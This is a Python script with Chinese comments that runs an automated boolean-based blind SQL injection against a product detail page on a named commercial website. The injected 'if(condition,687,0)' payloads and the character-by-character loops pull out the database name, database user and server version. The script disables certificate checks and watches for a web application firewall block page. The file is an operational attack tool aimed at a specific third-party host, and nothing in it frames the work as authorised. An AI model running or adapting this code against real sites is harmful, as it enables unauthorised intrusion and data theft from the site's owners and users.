#!/usr/bin/env python3
"""yijing_final_dump.py - yijingweb.com 布尔盲注(内容特征判定)
真=含"产品展示模块", 假=不含
通道: id=687' and if(条件,687,0)#
"""
import urllib.request, urllib.parse, ssl, re, sys

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

TRUE_MARK = '产品展示模块'  # 真页面(id=687)特有内容

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        b = r.read(80000).decode('utf-8','ignore')
    except urllib.error.HTTPError as e:
        b = e.read(80000).decode('utf-8','ignore')
    except Exception:
        return None
    if 'WTS-WAF' in b:
        return None
    if 'Invalid SQL' in b:
        return None
    return TRUE_MARK in b

def test(cond):
    return q("687' and if(%s,687,0)#" % cond)

def get_len(expr):
    for n in range(1, 65):
        r = test("length(%s)=%d" % (expr, n))
        if r is True:
            return n
    return None

def get_char(expr, pos, charset):
    for ch in charset:
        r = test("ascii(substr(%s,%d,1))=%d" % (expr, pos, ord(ch)))
        if r is True:
            return ch
    return None

def dump(expr, name, charset, maxlen=64):
    print('[%s]...' % name, flush=True)
    ln = get_len(expr)
    print('[%s] len=%s' % (name, ln), flush=True)
    if not ln:
        return '?'
    s = ''
    for i in range(1, ln+1):
        c = get_char(expr, i, charset)
        s += c if c else '?'
        if i % 10 == 0:
            print('  %d/%d: %s' % (i, ln, s), flush=True)
    print('[%s] = %s' % (name, s), flush=True)
    return s

if __name__ == '__main__':
    t = test('1=1')
    f = test('1=2')
    print('通道: 真=%s 假=%s' % (t, f), flush=True)
    if t is not True or f is not False:
        print('通道不稳', flush=True)
        sys.exit(1)

    charset = 'abcdefghijklmnopqrstuvwxyz0123456789_'
    db = dump('database()', 'database', charset, 32)
    user = dump('user()', 'user', charset + '@.', 40)
    ver = dump('version()', 'version', charset + '.-', 32)

    print('\n=== RESULT ===', flush=True)
    print('database:', db, flush=True)
    print('user:', user, flush=True)
    print('version:', ver, flush=True)
